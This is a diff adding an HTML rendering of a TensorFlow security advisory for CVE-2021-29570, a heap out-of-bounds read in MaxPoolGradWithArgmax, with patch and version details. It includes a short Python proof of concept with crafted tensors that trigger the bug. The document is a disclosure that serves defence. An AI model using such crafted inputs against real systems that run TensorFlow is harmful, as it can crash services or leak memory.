@@ -1,0 +1,40 @@
+<h2>TFSA-2021-057: Heap out of bounds read in <code>MaxPoolGradWithArgmax</code></h2>
+<h3>CVE Number</h3>
+<p>CVE-2021-29570</p>
+<h3>Impact</h3>
+<p>The implementation of <code>tf.raw_ops.MaxPoolGradWithArgmax</code> can cause reads outside
+of bounds of heap allocated data if attacker supplies specially crafted inputs:</p>
+<p>```python
+import tensorflow as tf</p>
+<p>input = tf.constant([10.0, 10.0, 10.0], shape=[1, 1, 3, 1], dtype=tf.float32)
+grad = tf.constant([10.0, 10.0, 10.0, 10.0], shape=[1, 1, 1, 4], dtype=tf.float32)
+argmax = tf.constant([1], shape=[1], dtype=tf.int64)
+ksize = [1, 1, 1, 1]
+strides = [1, 1, 1, 1]</p>
+<p>tf.raw_ops.MaxPoolGradWithArgmax(
+    input=input,
+    grad=grad,
+    argmax=argmax,
+    ksize=ksize,
+    strides=strides,
+    padding='SAME',
+    include_batch_in_index=False)
+```</p>
+<p>The
+<a href="https://github.com/tensorflow/tensorflow/blob/ef0c008ee84bad91ec6725ddc42091e19a30cf0e/tensorflow/core/kernels/maxpooling_op.cc#L1016-L1017">implementation</a>
+uses the same value to index in two different arrays but there is no guarantee
+that the sizes are identical.</p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit
+<a href="https://github.com/tensorflow/tensorflow/commit/dcd7867de0fea4b72a2b34bd41eb74548dc23886">dcd7867de0fea4b72a2b34bd41eb74548dc23886</a>.</p>
+<p>The fix will be included in TensorFlow 2.5.0. We will also cherrypick this
+commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow
+2.1.4, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security
+guide</a> for
+more information regarding the security model and how to contact us with issues
+and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu
+X-Team.</p>
